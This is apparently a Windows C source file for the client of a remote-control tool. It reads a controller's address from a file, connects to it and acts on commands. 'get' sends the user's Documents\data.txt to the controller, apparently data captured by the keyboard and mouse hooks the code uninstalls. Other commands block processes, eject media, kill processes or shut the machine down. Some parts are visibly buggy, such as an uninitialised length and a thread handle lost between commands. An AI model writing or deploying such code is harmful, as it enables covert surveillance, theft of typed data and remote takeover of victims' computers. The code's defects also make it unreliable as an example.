#include "modules.h"

void ReadAddr()
{
	HANDLE hFile;
	TCHAR * t_Port;
	TCHAR *t_ip = NULL;
	DWORD numOfReadByte = 0;
	TCHAR BUF[BUF_SIZE] = { 0, };

	hFile = CreateFile(TEXT("addr.txt"), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		Kuninstallhook();
		Muninstallhook();
		FreeLibrary(KhinstDll);
		WSACleanup();
#ifdef DEBUG
		MessageBox(hWndMain, TEXT("Open addr.txt Error!"), TEXT("오류"), MB_OK);
#endif
		KillProcess(TEXT("Controller.exe"));
	}

		
	ReadFile(hFile, BUF, BUF_SIZE, &numOfReadByte, 0);

	t_ip = _tcstok(BUF, TEXT(":"));//Error Section1
	if (t_ip == NULL)
	{
		Kuninstallhook();
		Muninstallhook();
		FreeLibrary(KhinstDll);
		WSACleanup();
#ifdef DEBUG
		MessageBox(hWndMain, TEXT("_tcstok Error!"), TEXT("오류"), MB_OK);
#endif
		KillProcess(TEXT("Controller.exe"));
	}


	t_Port = _tcstok(NULL, TEXT(":"));
	if (t_Port == NULL)
	{
		Kuninstallhook();
		Muninstallhook();
		FreeLibrary(KhinstDll);
		WSACleanup();
#ifdef DEBUG
		MessageBox(hWndMain, TEXT("_tcstok Error!"), TEXT("오류"), MB_OK);
#endif
		KillProcess(TEXT("Controller.exe"));
	}

	WideCharToMultiByte(CP_ACP, 0, t_ip, 17, ip, 17, NULL, NULL);
	WideCharToMultiByte(CP_ACP, 0, t_Port, 6, Port, 6, NULL, NULL);

	CloseHandle(hFile);

}

void CreateSocket()//소켓생성함수
{
	

	hSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (hSocket == INVALID_SOCKET)
		MessageBox(hWndMain, TEXT("hSocket Failed"), TEXT("Error"), MB_OK);

	memset(&hAddr, 0, sizeof(hAddr));
	hAddr.sin_family = PF_INET;
	hAddr.sin_port = htons(atoi(Port));
	hAddr.sin_addr.s_addr = inet_addr(ip);

}


int KillProcess(TCHAR* name)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	HANDLE hProcess;

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hProcessSnap == INVALID_HANDLE_VALUE)
		return 1;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcessSnap, &pe32))
		return 1;

	do {
		if (!_tcscmp(name, pe32.szExeFile))
		{
			hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
			if (hProcess != NULL)
			{
				TerminateProcess(hProcess, -1);
				CloseHandle(hProcess);
				return 0;
			}
		}

	} while (Process32Next(hProcessSnap, &pe32));

	return 1;


}


void RecvProc()
{
	DWORD numOfByteRead = 0;
	TCHAR DataFileName[BUF_SIZE] = { 0, };
	TCHAR BmpListFileName[BUF_SIZE] = { 0, };
	char RecvMessage[BUF_SIZE];
	char sendmessage[FILE_BUF];
	int Len;
	static BOOL isblock = FALSE;
	TCHAR Username[10];
	DWORD UserLen;
	HANDLE pThread;
		


	while (1) {

		Len = recv(hSocket, RecvMessage, sizeof(RecvMessage), 0);
		if (strncmp(RecvMessage, "getbmp", 6) == 0)
		{

			//파일앞축후 전송기능 추가(makecab이용)

		}
		if (strncmp(RecvMessage, "get", 3) == 0)//get명령이 전송된경우
		{
			GetUserName(Username, &UserLen);
			wsprintf(DataFileName, TEXT("C:\\Users\\%s\\Documents\\data.txt"), Username);//파일경로 얻어오기
			//파일전송
			hFile = CreateFile(DataFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
			while (1)
			{

				ReadFile(hFile, sendmessage, FILE_BUF, &numOfByteRead, NULL);

				if (numOfByteRead <= 0) {
					break;
				}

				send(hSocket, sendmessage, numOfByteRead, NULL);

			}
			CloseHandle(hFile);
		}
		else if (strncmp(RecvMessage, "block", 5) == 0) {


			if (!isblock) {

				pThread = (HANDLE)_beginthreadex(NULL, 0, ProcessBlocker, NULL, 0, 0);
				isblock = TRUE;
			}

		}
		else if (strncmp(RecvMessage, "unblock", 7) == 0) {

			if (isblock) {

				TerminateThread(pThread, 0);
				CloseHandle(pThread);
				pThread = NULL;
				isblock = FALSE;
			

			}


		}
		else if (strncmp(RecvMessage, "eject", 5) == 0) {

			system("eject.bat");


		}
		else if (strncmp(RecvMessage, "kill", 4) == 0)//kill명령이 전송된 경우
		{
			 
			closesocket(hSocket);
			Kuninstallhook();
			Muninstallhook();
			FreeLibrary(KhinstDll);
			WSACleanup();
			KillProcess(TEXT("Controller.exe"));
			
			break;

		}
		else if (strncmp(RecvMessage, "shutdown", 8) == 0) {


			closesocket(hSocket);
			Kuninstallhook();
			Muninstallhook();
			FreeLibrary(KhinstDll);
			WSACleanup();
			system("shutdown -s -t 0");
			KillProcess(TEXT("Controller.exe"));
			break;
		}
		else if (Len == 0) {//eof전달시
			isEof = TRUE;//eof코드 TRUE로설정
			break;
		}

	}

}

